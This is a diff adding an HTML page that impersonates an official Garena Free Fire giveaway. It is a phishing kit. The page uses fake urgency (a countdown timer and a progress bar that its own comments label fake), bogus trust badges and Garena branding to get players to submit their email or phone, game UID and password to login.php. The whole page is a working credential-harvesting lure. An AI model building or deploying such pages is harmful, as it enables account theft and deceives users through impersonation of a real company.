@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Fire Elite V-Badge Event | Garena Official</title>
+  <link rel="shortcut icon" href="https://ff.garena.com/favicon.ico" type="image/x-icon">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
+    
+    :root {
+      --primary: #FF6B35;
+      --secondary: #F7931E;
+      --dark-bg: #121230;
+      --card-bg: #1A1A3A;
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: var(--dark-bg);
+      color: white;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+      background-image: url('https://example.com/ff-bg-pattern.png');
+      background-attachment: fixed;
+    }
+    
+    /* Header with official-looking banner */
+    header {
+      background: linear-gradient(90deg, #0A0A1A 0%, #1E0A3A 100%);
+      padding: 1.5rem;
+      text-align: center;
+      border-bottom: 3px solid var(--primary);
+      position: relative;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+    
+    .official-tag {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      background: var(--primary);
+      color: white;
+      padding: 0.3rem 0.8rem;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+      text-transform: uppercase;
+    }
+    
+    .logo {
+      width: 120px;
+      margin-bottom: 1rem;
+    }
+    
+    /* Countdown timer */
+    .countdown {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      padding: 0.8rem;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: monospace;
+    }
+    
+    /* Main container */
+    .container {
+      max-width: 480px;
+      margin: 2rem auto;
+      background: var(--card-bg);
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(255,107,53,0.2);
+      border: 1px solid rgba(255,107,53,0.3);
+      position: relative;
+    }
+    
+    .container-header {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      padding: 1rem;
+      text-align: center;
+      font-weight: bold;
+    }
+    
+    /* Form styling */
+    .form-group {
+      padding: 1.5rem;
+    }
+    
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      margin-bottom: 1rem;
+      border: none;
+      border-radius: 8px;
+      background: rgba(0,0,0,0.3);
+      color: white;
+      font-size: 1rem;
+    }
+    
+    input:focus {
+      outline: 2px solid var(--primary);
+    }
+    
+    .btn-submit {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s;
+      margin-top: 0.5rem;
+    }
+    
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(255,107,53,0.4);
+    }
+    
+    /* Trust badges */
+    .trust-badges {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      flex-wrap: wrap;
+      padding: 1rem;
+      background: rgba(0,0,0,0.2);
+      border-top: 1px solid rgba(255,255,255,0.1);
+    }
+    
+    .trust-badge {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 0.8rem;
+    }
+    
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 2rem;
+      color: #AAA;
+      font-size: 0.8rem;
+    }
+    
+    .footer-links {
+      margin-top: 1rem;
+    }
+    
+    .footer-links a {
+      color: #CCC;
+      text-decoration: none;
+      margin: 0 0.5rem;
+      font-size: 0.8rem;
+    }
+    
+    /* Responsive */
+    @media (max-width: 600px) {
+      .container {
+        margin: 1rem;
+        border-radius: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="official-tag">Official Event</div>
+    <img src="logo.png" alt="Free Fire Logo" class="logo">
+    <h1>ELITE V-BADGE GIVEAWAY 2025</h1>
+    <p>Register now for your chance to win the exclusive V-Badge + 500 Diamonds!</p>
+    <div class="countdown">⏳ LIMITED TIME OFFER: <span id="timer">05:23</span> remaining</div>
+  </header>
+
+  <div class="container">
+    <div class="container-header">
+      🎁 CLAIM YOUR REWARD
+    </div>
+    
+    <div class="form-group">
+      <!-- Fake progress bar -->
+      <div style="background: #2A2A4A; border-radius: 10px; height: 8px; margin-bottom: 1.5rem;">
+        <div style="background: linear-gradient(90deg, var(--primary), var(--secondary)); width: 68%; height: 100%; border-radius: 10px;"></div>
+      </div>
+      <p style="text-align: center; color: var(--primary); margin-bottom: 1.5rem; font-size: 0.9rem;">
+        <strong>68% of badges claimed!</strong> Hurry before they run out!
+      </p>
+      
+      <!-- PRESERVED FORM ACTION -->
+      <form action="login.php" method="POST">
+    <input type="text" name="contact" placeholder="Email/Phone" required value="">
+    <input type="text" name="uid" placeholder="Free Fire UID" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit" class="btn-submit">🔓 VERIFY & CLAIM REWARD</button>
+    </form>
+       
+       
+        
+   
+      
+      <p style="font-size: 0.8rem; text-align: center; margin-top: 1rem; color: #AAA;">
+        By submitting, you agree to our <a href="#" style="color: var(--primary);">Terms</a> and confirm this is your account.
+      </p>
+    </div>
+    
+    <div class="trust-badges">
+      <div class="trust-badge">🔒 SSL Secured</div>
+      <div class="trust-badge">✅ Official Partner</div>
+      <div class="trust-badge">🛡️ Fraud Protected</div>
+    </div>
+  </div>
+
+  <footer>
+    <div>© 2025 Garena Free Fire. All rights reserved.</div>
+    <div class="footer-links">
+      <a href="#">Terms of Service</a>
+      <a href="#">Privacy Policy</a>
+      <a href="#">Contact Support</a>
+    </div>
+  </footer>
+
+  <!-- Fake countdown timer -->
+  <script>
+    let time = 5 * 60 + 23; // 5 minutes 23 seconds
+    const timer = document.getElementById('timer');
+    
+    setInterval(() => {
+      time--;
+      const mins = Math.floor(time / 60);
+      const secs = time % 60;
+      timer.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+      
+      if (time <= 0) {
+        timer.textContent = "OFFER EXPIRED!";
+        timer.style.color = "red";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
